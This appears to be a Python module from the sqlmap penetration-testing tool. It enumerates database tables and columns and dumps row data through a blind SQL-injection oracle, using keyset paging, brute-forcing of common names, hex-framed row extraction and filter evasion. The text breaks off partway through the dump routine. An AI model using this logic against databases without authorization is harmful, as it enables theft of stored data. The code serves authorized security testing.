#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from .atlas import _BULK_AGG
from .atlas import _COLUMN_SPECS
from .atlas import _HEX_PAYLOAD_CODES
from .atlas import _IDENT_QUOTE
from .atlas import _KEY_SPECS
from .atlas import _REPL
from .atlas import _ROWID
from .atlas import _ROWID_LITBOUND
from .records import BulkResult
from .records import Cap
from .records import InferenceStrategy
from .records import OracleUndecided
from .wordlist import commonColumns
from .wordlist import commonTables

_BRUTE_MAX_TRIES = 500      # cap existence-probes so a slow oracle can't run away
_MEMBERSHIP_PAGING_BUDGET = 8192   # max rendered NOT IN() fragment before stopping (partial) - it grows per row
# pseudo-columns that COUNT() accepts but that aren't real columns (would poison a dump)
_PSEUDO_COLUMNS = frozenset(("rowid", "_rowid_", "oid", "ctid", "rownum", "xmin", "xmax"))


class _Enumeration(object):
    """_Enumeration

    catalog walking + data dump: enumerate / columns / dump / bulk + row selection.
    When the catalog is unreadable/unknown (permission wall, exotic engine, CTF), the
    table/column listings fall back to brute-forcing common names (bruteTables /
    bruteColumns) so extraction works with zero schema knowledge."""

    def enumerate(self, kind="table", limit=10, schema=None):
        """Bounded enumeration by keyset (MIN(name) WHERE name>'prev') - no dialect
        row limiter needed, and cost scales with `limit`, not catalog size. `schema`
        scopes tables to one database. Falls back to brute-forcing common table names
        when the catalog is unavailable/empty. For a full dump prefer enumerateBulk."""
        names = None
        if kind in self.dialect.catalogEnum and self._canPage:
            names = self.enumerateKeyset(kind, limit, schema)
        if not names and kind == "table":
            names = self.bruteTables(limit, schema)     # no catalog/paging -> guess the usual names
        return names

    @property
    def _canPage(self):
        # keyset enumeration needs an ordered comparator or IN() (NOT IN paging); with
        # neither, the catalog walk can't advance past the first row -> use brute-force
        return self._comparator in ("gt", "between") or self._inOk

    def bruteTables(self, limit=50, schema=None):
        """No/unreadable catalog: discover tables by existence-probing common names
        (COUNT(*) succeeds -> exists; errors -> the oracle reads False). The 'know
        nothing about the schema' fallback, akin to sqlmap's --common-tables."""
        self.dialect.notes.append("catalog unavailable - brute-forcing common table names")
        found, tries = [], 0
        for name in commonTables():
            if len(found) >= limit or tries >= _BRUTE_MAX_TRIES:
                break
            tries += 1
            qname = self.quoteIdent(name)
            if schema is not None:
                qname = "%s.%s" % (self.quoteIdent(schema), qname)
            try:
                if self._exists(qname):
                    found.append(name)
                    self._emit(name)
            except OracleUndecided:
                break                                   # oracle wall - stop, keep what we have
        return found

    def bruteColumns(self, table, schema=None, limit=100):
        """No/unreadable column catalog: discover columns of `table` by existence-
        probing common names (COUNT(col) succeeds -> the column exists)."""
        qtable = self.quoteIdent(table)
        if schema is not None:
            qtable = "%s.%s" % (self.quoteIdent(schema), qtable)
        found, tries = [], 0
        for col in commonColumns():
            if len(found) >= limit or tries >= _BRUTE_MAX_TRIES:
                break
            if col.lower() in _PSEUDO_COLUMNS:      # rowid/ctid/oid... are queryable but not real columns
                continue
            tries += 1
            try:
                # probe the column BARE but ALIAS-QUALIFIED (`e.col`): a nonexistent bare
                # column errors (a double-quoted unknown is a STRING LITERAL on SQLite -> would
                # pass every fake name), and the alias stops a candidate that is really a
                # KEYWORD/FUNCTION (e.g. `user` -> USER) from resolving. COUNT-free (WAF-safe).
                if self._exists(qtable, col, alias="e"):
                    found.append(col)
                    self._emit(col)
            except OracleUndecided:
                break
        if found:
            self.dialect.notes.append("column catalog unavailable - brute-forced %d common column names" % len(found))
        return found

    def _source(self, kind, schema=None):
        col, src, filt = self.dialect.catalogEnum[kind]
        clauses = [filt] if filt else []
        if schema is not None and "schema" in self.dialect.catalogEnum:
            scol, ssrc = self.dialect.catalogEnum["schema"][0], self.dialect.catalogEnum["schema"][1]
            # the scope column is only valid IN ITS OWN source. ANSI/PG/Oracle co-locate
            # table+schema in one catalog view; MSSQL splits them (sys.tables vs sys.schemas)
            # so `name=<schema>` on sys.tables would match table NAMES - skip it, don't corrupt.
            if ssrc == src:
                clauses.append("%s=%s" % (scol, self.buildLiteral(schema)))
        return col, src, ((" WHERE " + " AND ".join(clauses)) if clauses else "")

    def enumerateKeyset(self, kind, limit=10, schema=None):
        if kind not in self.dialect.catalogEnum:
            return None
        col, src, where = self._source(kind, schema)
        return self._keysetWalk(col, src, where, limit)

    def _keysetWalk(self, col, src, where, limit):
        # page by keyset: MIN(name) then MIN(name) WHERE name > prev. no dialect row
        # limiter needed. the FIRST query is unbounded (a space/'' seed would skip
        # identifiers sorting below it). the DB does the ordering in its own
        # collation; Python only tests EXACT repetition (collation-invariant) - never
        # a Python `<=` ordering test.
        conj = " AND " if where else " WHERE "
        names, prev = [], None
        while len(names) < limit:
            if prev is None:
                expr = "(SELECT MIN(%s) FROM %s%s)" % (col, src, where)
            else:
                beyond = self._beyondSql(col, prev, "text", seen=names)
                if beyond is None:                   # no ordered comparator, no IN -> can't page
                    self.dialect.notes.append("enumeration stopped: no way to page (no ordered comparator, no IN)")
                    break
                expr = "(SELECT MIN(%s) FROM %s%s%s%s)" % (col, src, where, conj, beyond)
            # a best-effort walk must DEGRADE, not crash: an undecided/over-budget
            # probe (permission or charset wall) stops the listing with what we have
            try:
                if not self._ask("%s IS NOT NULL" % expr):
                    break
                res = self.extractResult(expr)       # complete-or-stop: a partial name is a bad keyset bound
            except OracleUndecided:
                self.dialect.notes.append("enumeration stopped early (oracle undecided - permission/charset wall)")
                break
            if not res.complete:                 # incomplete (truncated / unresolved / unverified) name is
                self.dialect.notes.append("enumeration stopped: incomplete identifier read (unsafe keyset bound)")
                break                            # an unsafe keyset bound - a soft case/accent warning still passes
            name = res.value
            if not name:
                break
            if name in names:
                # revisiting an already-listed name (not just the immediate predecessor) means the
                # paging bound and the recovered spelling disagree - e.g. the keyset compare and
                # the char read resolve under DIFFERENT collations, so the walk cycles f,e,f,e...
                # Stop with a PARTIAL, de-duplicated list rather than loop or emit duplicates.
                self.dialect.notes.append("enumeration stopped: identifier %r revisited "
                                          "(paging/read-back collation mismatch) - list may be partial" % name)
                break
            if not res.exact and not self._nonExactNamesNoted:
                # the name paged correctly (the walk uses the engine's OWN collation, so a
                # case/accent-ambiguous bound is self-consistent) but its exact spelling is NOT
                # proven - flag it, since a caller may reuse the name as an exact SQL identifier.
                self._nonExactNamesNoted = True
                self.dialect.notes.append("enumerated identifiers are case/accent-approximate "
                                          "(no byte-exact primitive) - exact spelling not proven")
            names.append(name)
            self._emit(name)                         # live feedback per discovered name
            if _REPL in name:
                # an unrecoverable char in the name can't form a reliable keyset bound;
                # stop rather than loop on a corrupt (or repeating) boundary
                self.dialect.notes.append("enumeration stopped: %r holds an unrecoverable character" % name)
                break
            prev = name
        return names

    def _beyondSql(self, expr, prev, unit, seen=None, boundfn=None):
        # SQL fragment picking the next un-taken row for keyset paging, honoring the
        # discovered comparator so paging survives a blocked '>'. '>' pages by "sorts
        # after prev"; a blocked '>' keeps numeric keys ordered via BETWEEN, and pages
        # text keys order-free by "key NOT IN (already-seen)" (needs only IN, and dodges
        # any collation/sentinel guesswork). Returns None when none of these is possible
        # - the caller then stops with the rows it already has.
        lit = boundfn or self.buildLiteral        # rowids may need a quoted literal (see _ROWID_LITBOUND)
        if self._comparator == "gt":
            bound = prev if unit == "int" else lit(prev)
            return "%s>%s" % (expr, bound)
        if self._comparator == "between" and unit == "int":
            return "%s BETWEEN %s+1 AND 9223372036854775807" % (expr, prev)
        if self._cmpTemplate is not None and unit == "int":   # operator-free ordered rung
            return self._cmpTemplate.format(expr=expr, n=prev)   # "expr > prev" without '>'
        if self._inOk and seen:
            lits = ",".join((str(k) if unit == "int" else lit(k)) for k in seen)
            frag = "%s NOT IN (%s)" % (expr, lits)
            # NOT IN(all-seen) grows every row (quadratic payload / WAF surface). Beyond a
            # rendered-size budget, stop with a PARTIAL result + note rather than emitting an
            # ever-larger request (and never let one un-renderable literal poison the walk).
            if len(frag) > _MEMBERSHIP_PAGING_BUDGET:
                self.dialect.notes.append("membership paging stopped: NOT IN() payload budget exceeded (partial)")
                return None
            return frag
        return None

    def hasTable(self, table, schema=None):
        """Does `table` (optionally in `schema`) resolve? COUNT-free existence."""
        q = self.quoteIdent(table)
        if schema:
            q = "%s.%s" % (self.quoteIdent(schema), q)
        try:
            return self._exists(q)
        except OracleUndecided:
            return False

    def tableSchema(self, table):
        """Resolve which schema a table actually lives in, from the catalog. PG-family
        tables are commonly in 'public' while current_schema() is the login user's own
        (empty) schema, so scoping to the current schema misses them. Returns the schema
        name, or None if the catalog has no schema concept or the table isn't found."""
        ce = self.dialect.catalogEnum
        if "schema" not in ce or "table" not in ce:
            return None
        schemacol = ce["schema"][0]
        namecol, source = ce["table"][0], ce["table"][1]
        if ce["schema"][1] != source:       # schema lives in a SEPARATE catalog view (MSSQL
            return None                     # sys.schemas) - can't co-query it against sys.tables
        # prefer a non-system schema (a system table could share the name)
        excl = ("pg_catalog", "information_schema", "sys", "mysql", "performance_schema",
                "SYS", "INFORMATION_SCHEMA", "pg_toast")
        notsys = " AND %s NOT IN (%s)" % (schemacol, ",".join(self.buildLiteral(s) for s in excl))
        for tail in (notsys, ""):
            expr = "(SELECT MIN(%s) FROM %s WHERE %s=%s%s)" % (schemacol, source, namecol, self.buildLiteral(table), tail)
            try:
                if self._ask("%s IS NOT NULL" % expr):
                    res = self.extractResult(expr)   # a SCHEMA NAME becomes a qualifier -> require EXACT
                    if res.exact and res.value:
                        return res.value
            except OracleUndecided:
                break
        return None

    def quoteIdent(self, name):
        """Quote a target-supplied identifier (table/column) so reserved words,
        spaces, dots, or embedded quote chars are referenced safely. A name is an
        IDENTIFIER, never a raw SQL fragment. Falls back to the bare name if no
        quoting style was discovered."""
        q = self.dialect.identQuote
        if not q:
            return name
        return "%s%s%s" % (q[0], name.replace(q[1], q[1] * 2), q[1])

    def qualify(self, table, schema=None):
        """The quoted, optionally schema-scoped table reference used for a dump - the SAME
        expression for count, key discovery, and row retrieval, so a non-default schema can't
        make the count query hit a different (unqualified) table than the dump."""
        qt = self.quoteIdent(table)
        return "%s.%s" % (self.quoteIdent(schema), qt) if schema is not None else qt

    def _ensureQuoting(self, table):
        # discover the identifier-quote style using the (known-present) table:
        # the wrong quote char makes SELECT ... FROM <quoted> error -> reject
        if self.dialect.identQuote is not None or self.dialect.identQuote is False:
            return self.dialect.identQuote or None
        with self._probePhase():            # a wrong quote char makes FROM <quoted> error -> "unusable", not undecided
            for open_q, close_q in _IDENT_QUOTE:
                quoted = "%s%s%s" % (open_q, table.replace(close_q, close_q * 2), close_q)
                if self._exists(quoted):
                    self.dialect.identQuote = (open_q, close_q)
                    return self.dialect.identQuote
            self.dialect.identQuote = False             # sentinel: probed, none worked
        return None

    def columns(self, table, schema=None, limit=50):
        """Enumerate a table's column names (keyset), optionally scoped to `schema`
        (so identically-named tables in different schemas don't merge columns). Falls
        back to brute-forcing common column names when no column catalog is usable."""
        names = None
        spec = _COLUMN_SPECS.get(self.dialect.catalog)
        if spec and self._canPage:
            col, source, wheretmpl = spec[0], spec[1], spec[2]
            ordcol = spec[3] if len(spec) > 3 else None     # catalog's ordinal-position column
            schemacol = spec[4] if len(spec) > 4 else None  # the column source's OWN schema column
            lit = self.buildLiteral(table)
            filt = (wheretmpl % lit) if wheretmpl else ""
            if schema is not None and schemacol:            # explicit (e.g. Oracle OWNER, not table_schema)
                filt += " AND %s=%s" % (schemacol, self.buildLiteral(schema))
            elif schema is not None and "table_name" in (wheretmpl or ""):   # ANSI-shaped filter
                filt += " AND table_schema=%s" % self.buildLiteral(schema)
            elif schema is not None and "TABLE_NAME" in (wheretmpl or ""):
                filt += " AND TABLE_SCHEMA=%s" % self.buildLiteral(schema)
            where = (" WHERE %s" % filt) if filt else ""
            # pragma_table_info(%s) takes the table in the source itself
            source = source % lit if "%s" in source else source
            names = self._keysetWalk(col, source, where, limit)
            if names and ordcol:
                names = self._orderByOrdinal(names, col, source, filt, ordcol)
        if not names:
            names = self.bruteColumns(table, schema, limit)  # no catalog -> guess the usual names
        return names

    def _orderByOrdinal(self, names, namecol, source, filt, ordcol):
        # reorder the enumerated columns by their catalog ordinal so a dump matches the
        # table's DEFINITION order, not the alphabetical MIN()-keyset order (+1 read per
        # column). Degrades gracefully: a missing/wrong ordinal sorts last, never crashes.
        keyed = []
        for n in names:
            cond = "%s=%s" % (namecol, self.buildLiteral(n))
            if filt:
                cond = "%s AND %s" % (filt, cond)
            try:
                o = self.extractInteger("(SELECT MIN(%s) FROM %s WHERE %s)" % (ordcol, source, cond))
            except (OracleUndecided, OverflowError):
                o = None
            keyed.append((o if o is not None else 1 << 30, n))
        return [n for _, n in sorted(keyed, key=lambda t: (t[0], t[1]))]

    def _discoverKey(self, table, schema=None):
        # a primary/unique key column, preferred over a physical rowid. keyset needs
        # MIN() over it and a `> prev` bound, both of which a key column supports.
        spec = _KEY_SPECS.get(self.dialect.catalog)
        if not spec:
            return None
        source, tcol, ncol, extra = spec
        filt = "%s=%s" % (tcol, self.buildLiteral(table))
        if schema is not None:
            filt += " AND table_schema=%s" % self.buildLiteral(schema)
        if extra:
            filt += " AND %s" % extra
        # take the alphabetically-first key column (deterministic); a compound key
        # still yields a usable ordering column for the walk
        keyexpr = "(SELECT MIN(%s) FROM %s WHERE %s)" % (ncol, source, filt)
        # discovering the key COLUMN NAME is setup, not data - run it inside the probe phase so a
        # catalog lacking this key structure degrades to "no key" (not fatal) AND so the name does
        # not surface on the live "retrieved:" feed (it is a column name, not a dumped entry).
        with self._probePhase():
            if self._ask("%s IS NOT NULL" % keyexpr):
                res = self.extractResult(keyexpr)   # a key COLUMN NAME becomes SQL -> require an EXACT value
                if res.exact and res.value:          # (a case-ambiguous name could mis-target)
                    return res.value
        return None

    def columnType(self, expr):
        """Coarse type hint: 'numeric' vs 'text'. RELIABLE ONLY ON STRICTLY-TYPED
        engines (PostgreSQL/Oracle/SQL Server/DB2), where SUM() over a text column
        errors. Dynamically-typed engines (SQLite, MySQL non-strict) coerce text->0
        so SUM succeeds - there the hint is unreliable and returns 'unknown' when it
        can't tell. Not a substitute for reading the catalog's declared type."""
        sums = self._ask("(SELECT SUM(%s) FROM (SELECT %s) t) IS NOT NULL" % (expr, expr))
        if not sums:
            return "text"                       # SUM errored -> definitely not numeric
        # SUM worked: real numeric, OR a coercing dynamic engine. disambiguate with a
        # cheap non-digit check on the first char (via the discovered substring)
        try:
            one = self._sub(self._resolveText(expr), 1, 1)
            if self._ask("%s>='0' AND %s<='9'" % (one, one)) or self._ask("%s='-'" % one):
                return "numeric"
        except Exception:
            pass
        return "unknown"

    def _classifyUnit(self, keyexpr, qtable):
        # a key/rowid reads as int (fast extractInteger + numeric bound) or opaque text
        # (extract + literal bound). DEFAULT TEXT (safe, just slower) - misreading a text or
        # decimal/float key as int DESTROYS the paging boundary (reviewer: 'a','1' and 1.5,2.5
        # both broke). 'int' requires an EXACT-INTEGER round-trip, not a mere numeric sort:
        #  - strict engines: `text = <int>` ERRORS -> text (probe phase reads False)
        #  - a decimal/float (1.5) extracts as 2 and `1.5 = 2` is False -> text
        #  - a genuine integer N round-trips `expr = N` -> int
        # all rendered through the DISCOVERED comparator (_gtNum), never a raw '>='/'<'.
        q = "(SELECT MIN(%s) FROM %s)" % (keyexpr, qtable)
        if self._comparator == "membership":
            return "text"                       # no ordered numeric compare -> literal-bound text
        with self._probePhase():   # a numeric comparison on a TEXT key ERRORS on strict engines -> False
            if not (self._numDefined(q) and self._gtNum(q, -(1 << 62) - 1, 1 << 62)):
                return "text"                   # not comparable as a number (or NULL)
            try:
                n = self.extractInteger(q)      # signed, via the discovered comparator
            except (OracleUndecided, OverflowError):
                return "text"
            # 'int' requires BOTH: (a) numeric equality `q = n` (catches a decimal - 1.5 extracts
            # as 2 and 1.5 = 2 is false), and (b) the value LOOKS numeric - first char a digit or
            # '-'. A loose engine coerces text->0 so `'AA' = 0` is spuriously true, but 'AA' starts
            # with a non-digit; and (b) uses no `=`-to-string (SQLite won't coerce `1 = '1'`).
            if n is not None and self._ask("(%s)=(%d)" % (q, n)) and self._looksNumeric(q):
                return "int"
        return "text"

    def _looksNumeric(self, expr):
        # first char is a digit or '-' (order-free IN test, so a blocked '>' doesn't matter).
        # rejects non-digit text a loose engine coerced to 0; no substring to inspect -> can't
        # refute -> keep the numeric verdict (never break a real int on a substring-less floor).
        if self.dialect.substring is None:
            return True
        try:
            one = self._sub(self._resolveText(expr), 1, 1)
            return self._ask("%s IN ('0','1','2','3','4','5','6','7','8','9','-')" % one)
        except OracleUndecided:
            return True

    def _discoverRowid(self, qtable):
        # find a MIN-aggregatable physical row identifier for the (already-quoted)
        # table; classify int vs opaque text (SQLite rowid is int; Oracle ROWID text).
        # each candidate is a PROBE: a pseudo-column the engine lacks (ROWID on MSSQL,
        # ctid off-PG, ...) errors, which must skip to the next candidate, not fail the dump
        with self._probePhase():
            for name, tmpl, _unit in _ROWID:
                rid = tmpl % qtable if "%s" in tmpl else tmpl
                if not self._ask("(SELECT MIN(%s) FROM %s) IS NOT NULL" % (rid, qtable)):
                    continue
                unit = self._classifyUnit(rid, qtable)
                # a physical row-id used as a keyset must be a sane NON-NEGATIVE int;
                # Informix's `rowid` reads as a bogus negative here -> reject it and fall
                # through to the value-keyset walk rather than feed extractInteger garbage
                if unit == "int" and self._comparator == "gt" and \
                   not self._ask("(SELECT MIN(%s) FROM %s)>=0" % (rid, qtable)):
                    continue
                return Cap(name, rid, unit=unit)
        return None

    def _keyIsUnique(self, kexpr, qtable, total=None):
        # a keyset ordering column MUST be single-column unique AND non-NULL, else `> prev`
        # paging silently DROPS rows: a composite key's first column repeats (skipping the
        # shared-value rows), and NULL keys sort outside the walk. Verified against the DATA
        # (COUNT(*) == COUNT(DISTINCT key)) - a NULL key or duplicate makes distinct < total -
        # so it holds regardless of how the constraint catalog was joined.
        try:
            if total is None:
                total = self.extractInteger("(SELECT COUNT(*) FROM %s)" % qtable)
            distinct = self.extractInteger("(SELECT COUNT(DISTINCT %s) FROM %s)" % (kexpr, qtable))
        except (OracleUndecided, OverflowError):
            return False
        return total is not None and distinct is not None and total == distinct

    def _walkKey(self, qtable, table, schema, total=None):
        # ordering key, best-first: primary/unique key -> physical row-id -> value.
        # returns (key_expr, unit, source_label, boundfn); boundfn formats a keyset
        # comparison bound (quoted literal for opaque-typed row-ids, else buildLiteral).
        key = self._discoverKey(table, schema)
        if key:
            kexpr = self.quoteIdent(key)
            if self._keyIsUnique(kexpr, qtable, total):
                return kexpr, self._classifyUnit(kexpr, qtable), "key:%s" % key, self.buildLiteral
            self.dialect.notes.append("key %s not single-column unique -> row-id/value keyset" % key)
        rid = self._discoverRowid(qtable)
        if rid is not None:
            boundfn = self._lit if rid.name in _ROWID_LITBOUND else self.buildLiteral
            return rid.template, rid.get("unit"), "rowid:%s" % rid.name, boundfn
        return None, None, "value", self.buildLiteral

    def _rowPayload(self, cols):
        # one hex-framed, NULL-PRESERVING token per column. When a length fn + text cast exist,
        # each token embeds an INDEPENDENT character-length witness and a terminal marker:
        #     V<charlen>:<hex>;    (value)      N;    (SQL NULL)
        # so a capped/lossy HEX or CONCAT that SHORTENS the value is caught (`_splitRow` rejects a
        # token whose decoded char count != the declared source length, or whose ';' is missing).
        # Length counts CHARACTERS -> invariant under a re-encoding cast, and is measured by a
        # DIFFERENT primitive than hex/concat, so it is not self-certifying. Without a length fn /
        # cast the plain 'N' / 'V'+hex grammar (',' delimited) is used - framing still works, but
        # the whole-value length witness is unavailable (noted). Needs hex + concat to frame a row.
        if not self._ensureHexfn() or not self.dialect.concat:
            return None, False              # can't frame a whole row -> caller scavenges cell-by-cell
        self._rowLenFramed = bool(self.dialect.length and self.dialect.textcast)
        if not self._rowLenFramed:
            self.dialect.notes.append("row framing without a length witness (no length fn/cast) - "
                                      "a capped hex/concat could shorten a cell undetected")
        parts = []
        for c in cols:
            qc = self.quoteIdent(c)             # column names are identifiers, not raw SQL
            # text-cast before hex so a numeric/date column yields its TEXT form, not
            # DBMS-internal storage bytes (SQL Server CAST(1 AS VARBINARY)=00000001)
            text = self.dialect.textcast[1].format(expr=qc) if self.dialect.textcast else qc
            hexed = self.dialect.hexfn[1].format(expr=text)
            if self._rowLenFramed:
                lenstr = self.dialect.textcast[1].format(expr=self._len(qc))   # source CHAR length as text
                body = self._concatMany(["'V'", lenstr, "':'", hexed, "';'"])
                parts.append("CASE WHEN (%s) IS NULL THEN 'N;' ELSE %s END" % (qc, body))
            else:
                marked = self.dialect.concat[1].format(a="'V'", b=hexed)
                parts.append("CASE WHEN (%s) IS NULL THEN 'N' ELSE %s END" % (qc, marked))
        if self._rowLenFramed:
            return self._concatMany(parts), True       # tokens self-terminate with ';'
        interleaved = [parts[0]]
        for p in parts[1:]:
            interleaved.append("','")                  # the ',' row-token delimiter
            interleaved.append(p)
        return self._concatMany(interleaved), True    # flat when concat is variadic

    def _cellRow(self, qtable, cols, where):
        # SCAVENGER row read: pull each column on its own. A single value needs no comma/
        # marker framing (so no concat) and its NULL is detected directly (so no hex 'N'
        # sentinel) - this is how a dump still works on a back-end that can neither
        # concatenate nor hex-encode. Slower (one extraction per cell), but it retrieves.
        row = []
        for c in cols:
            res = self.extractResult("(SELECT %s FROM %s WHERE %s)" % (self.quoteIdent(c), qtable, where))
            if not res.complete:
                return None, False
            row.append(res.value)
        return row, True

    def _splitRow(self, data, ncols):
        # returns (row, valid); a malformed token count/marker/length means invalid, never
        # a silently padded/truncated plausible row.
        # framed cells are hex of a TEXT-CAST value, whose bytes are in the CAST's output charset
        # (the connection/expression charset - MySQL re-encodes a latin1 column to utf-8 here), so
        # use the PROVEN hex encoding, NOT the column's declared charset (that governs RAW bytes).
        if data is None:
            return None, False
        # EFFECTIVE encoding: the proven per-expression hex codec, else the discovered charset (now
        # the CONNECTION charset, which is what the CAST outputs). Same evidence the dump-exactness
        # check below consumes, so decode and integrity never disagree.
        enc = (self.dialect.hexfn.get("encoding") if self.dialect.hexfn else None) or self.dialect.charset
        if getattr(self, "_rowLenFramed", False):
            # V<charlen>:<hex>; / N;  -> every token MUST carry its terminal ';' and (for a value)
            # decode to EXACTLY the declared source char length; a capped hex/concat fails one.
            if not data.endswith(";"):               # a truncated final token dropped its terminator
                return None, False
            toks = data.split(";")
            if toks and toks[-1] == "":
                toks = toks[:-1]                     # drop the trailing terminator
            if len(toks) != ncols:
                return None, False                   # a truncated final token loses its ';' -> count off
            vals = []
            for t in toks:
                if t == "N":
                    vals.append(None)
                    continue
                if not t.startswith("V") or ":" not in t:
                    return None, False
                lenpart, _, hexpart = t[1:].partition(":")
                if not lenpart.isdigit():
                    return None, False
                v = "" if hexpart == "" else self._decodeHexToken(hexpart, enc)
                if v is None or len(v) != int(lenpart):   # INDEPENDENT length witness: decoded != source
                    return None, False
                vals.append(v)
            return vals, True
        toks = data.split(",")                       # plain grammar (no length witness available)
        if len(toks) != ncols:
            return None, False
        vals = []
        for t in toks:
            if t == "N":
                vals.append(None)
            elif t == "V":
                vals.append("")
            elif t.startswith("V"):
                v = self._decodeHexToken(t[1:], enc)
                if v is None:
                    return None, False
                vals.append(v)
            else:
                return None, False
        return vals, True

    def dump(self, table, columns=None, schema=None, limit=10):
        """Extract actual ROW DATA. Table/column names are treated as quoted
        IDENTIFIERS (never raw SQL). Optionally scoped to `schema`. Rows are walked
        by a primary/unique KEY when discoverable, else a physical row-id, else the
        row's own value (distinct-only); each row is one hex-framed, NULL-preserving,
        text-cast extraction. Completeness is checked against COUNT(*). Returns
        {columns, rows, complete, keyed_by}."""
        self._ensureQuoting(table)
        qtable = self.qualify(table, schema)
        cols = columns or self.columns(table, schema)
        if not cols:
            return None
        payload, framed = self._rowPayload(cols)
        if not framed:                               # no hex/concat to frame a whole row
            self.dialect.notes.append("dump %s: no hex/concat framing - scavenging cell-by-cell" % table)
        try:
            expected = self.extractInteger("(SELECT COUNT(*) FROM %s)" % qtable)
        except (OracleUndecided, OverflowError):        # unknown/huge count -> walk up to `limit`, not a failure
            expected = None
        if expected == 0:
            return {"columns": cols, "rows": [], "complete": True, "exact": True, "keyed_by": None}
        keyexpr, unit, keyed_by, boundfn = self._walkKey(qtable, table, schema, total=expected)
        rows, ok = [], True

        def readrow(where):
            # a whole row: one framed extraction when hex+concat exist, else cell-by-cell. The
            # framed token carries an INDEPENDENT length witness + terminal marker (see _rowPayload),
            # so _splitRow rejects a bounded/lossy hex/concat that shortened a cell; a rejected or
            # errored framed read degrades to cell-by-cell (which reads each cell at its true length,
            # so it cannot be cast-truncated) rather than dropping the row.
            if framed:
                try:
                    res = self.extractResult("(SELECT %s FROM %s WHERE %s)" % (payload, qtable, where), codes=_HEX_PAYLOAD_CODES)
                    if res.complete:
                        row, ok2 = self._splitRow(res.value, len(cols))
                        if ok2:
                            return row, ok2
                except OracleUndecided:
                    pass                        # framed whole-row read errored -> cell-by-cell
            return self._cellRow(qtable, cols, where)

        # a best-effort walk must DEGRADE, not crash: an undecided/over-budget probe
        # (permission or charset wall) stops with whatever rows were recovered
        try:
            if keyexpr is not None:                  # key / row-id keyset (preferred)
                prev, keys = None, []
                while len(rows) < limit:
                    if prev is None:
                        where = ""
                    else:
                        beyond = self._beyondSql(keyexpr, prev, unit, seen=keys, boundfn=boundfn)
                        if beyond is None:           # no ordered comparator, no IN -> can't page
                            break
                        where = " WHERE %s" % beyond
                    ke = "(SELECT MIN(%s) FROM %s%s)" % (keyexpr, qtable, where)
                    if unit == "int":
                        key = self.extractInteger(ke)    # None = NULL (MIN over empty set) = no more rows
                    else:
                        res = self.extractResult(ke)     # never page on a partial/unverified key bound
                        if res.is_null:                  # MIN over empty set -> genuinely done
                            break
                        if not res.complete:             # incomplete key can't be a reliable bound
                            ok = False
                            self.dialect.notes.append("dump %s: incomplete key read -> stopped (partial)" % table)
                            break
                        key = res.value                  # '' is a VALID (single, unique) key row, not a terminator
                    if key is None or key == prev:       # None = done; == prev = paging stuck (safety)
                        break
                    bound = key if unit == "int" else boundfn(key)
                    row, valid = readrow("%s=%s" % (keyexpr, bound))
                    if not valid:                    # a truncated/invalid cell != complete row
                        ok = False
                        break
                    rows.append(row)
                    self._emit(", ".join("NULL" if c is None else c for c in row))
                    prev = key
                    keys.append(key)                 # for order-free NOT IN() paging
            else:                                    # value keyset (distinct rows only)
                ok = False
                # ACCURATE loss report: a framed page-key is the whole-row tuple, so only
                # fully-identical rows collapse; a bare first-column page-key collapses every
                # row that merely shares column 1 (much lossier) - say which, don't blur it
                # also: MIN() never selects a NULL page-key, so rows with a NULL in the page
                # column are unreachable by this walk - call that out too (not just collapse)
                loss = "identical rows collapse" if framed else \
                       "rows sharing column '%s' collapse, and rows with a NULL there are unreachable" % cols[0]
                self.dialect.notes.append("dump %s: no key/row-id, value-keyset walk (%s)" % (table, loss))
                pageexpr = payload if framed else self.quoteIdent(cols[0])
                # the framed page-key is text; a bare first-column page-key may be numeric,
                # and a numeric column MUST be read via extractInteger + a numeric bound - a
                # text SUBSTR read mangles e.g. Derby's space-padded INT->CHAR into a garbage
                # bound ("id='   '") that matches no row (dump silently returns 0 entries)
                pageunit = "text" if framed else self._classifyUnit(pageexpr, qtable)
                prev, seen = None, []
                while len(rows) < limit:
                    if prev is None:
                        where = ""
                    else:
                        beyond = self._beyondSql(pageexpr, prev, pageunit, seen=seen)
                        if beyond is None:           # no ordered comparator, no IN -> can't page
                            break
                        where = " WHERE %s" % beyond
                    if framed:
                        res = self.extractResult("(SELECT MIN(%s) FROM %s%s)" % (pageexpr, qtable, where), codes=_HEX_PAYLOAD_CODES)
                        pv, valid = res.value, res.complete
                        row, ok2 = self._splitRow(pv, len(cols)) if pv is not None else (None, False)
                        valid = valid and ok2
                    elif pageunit == "int":          # numeric first column: read + bound as a number
                        pv = self.extractInteger("(SELECT MIN(%s) FROM %s%s)" % (pageexpr, qtable, where))
                        row, valid = self._cellRow(qtable, cols, "%s=%s" % (pageexpr, pv)) if pv is not None else (None, False)
                    else:                            # page on the first (text) column, read cells under it
                        kr = self.extractResult("(SELECT MIN(%s) FROM %s%s)" % (pageexpr, qtable, where))
                        if kr.is_null:               # MIN over empty set -> done
                            break
                        if not kr.complete:          # incomplete page bound -> can't page reliably, stop
                            break
                        pv = kr.value                # '' is a valid first-column value, not a terminator
                        row, valid = self._cellRow(qtable, cols, "%s=%s" % (pageexpr, self.buildLiteral(pv)))
                    if pv is None or pv == prev or not valid:
                        break
                    rows.append(row)
                    self._emit(", ".join("NULL" if c is None else c for c in row))
                    if isinstance(pv, str) and _REPL in pv:   # a corrupt (unrecoverable) text bound can't page reliably; an int bound never carries _REPL
                        break
                    prev = pv
                    seen.append(pv)                  # for order-free NOT IN() paging
        except (OracleUndecided, OverflowError):
            # degrade, never crash: an undecided oracle (permission/charset wall) or a
            # bogus key that overflows extractInteger stops the walk with partial rows
            self.dialect.notes.append("dump %s stopped early (oracle undecided / bad key)" % table)
            ok = False
        # TWO independent dimensions: `complete` = COVERAGE (every row, extracted cleanly);
        # `exact` = CONTENT integrity (the recovered bytes are provably the source's). A dump can
        # cover every row yet hold case/accent-ambiguous cells when the dialect has no byte-exact
        # primitive (no hex/binary, not code-codepoint) - callers must surface that, not hide it.
        complete = ok and expected is not None and len(rows) == expected
        exact = bool(self._byteFaithful())
        # EFFECTIVE decode codec (same evidence _splitRow uses): a proven hex encoding OR the
        # discovered charset. Non-ASCII text is provably exact only when that codec is KNOWN -
        # using the same field for decode AND for the exact verdict, so a proven-utf-8 dump is
        # NOT falsely inexact, and a decode that fell back to a guess is NOT falsely exact.
        effenc = (self.dialect.hexfn.get("encoding") if self.dialect.hexfn else None) or self.dialect.charset
        note = None
        if rows and not exact:
            note = ("dump %s: values recovered via a collation-dependent comparison "
